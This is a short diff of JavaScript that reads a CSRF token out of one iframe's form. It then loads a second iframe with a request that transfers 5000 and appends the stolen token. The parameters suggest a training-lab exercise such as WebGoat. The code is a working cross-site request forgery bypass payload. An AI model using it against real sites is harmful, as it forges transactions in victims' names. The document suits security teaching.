@@ -6,16 +6,12 @@
 
     function first() {
         var frame = document.getElementById("first").contentDocument;
-        var form = frame.getElementsByTagName("form")[0];
-        token = '&CSRFToken=' + form.CSRFToken.value;
-
-        console.log(token);
-
+        token = frame.getElementsByTagName("form")[0].CSRFToken.value;
         second();
     }
 
     function second() {
         var frame = document.getElementById("second");
-        frame.src = "attack?Screen=1721642316&menu=900&transfer=5000" + token;
+        frame.src = "attack?Screen=1721642316&menu=900&transfer=5000&CSRFToken=" + token;
     }
 </script>
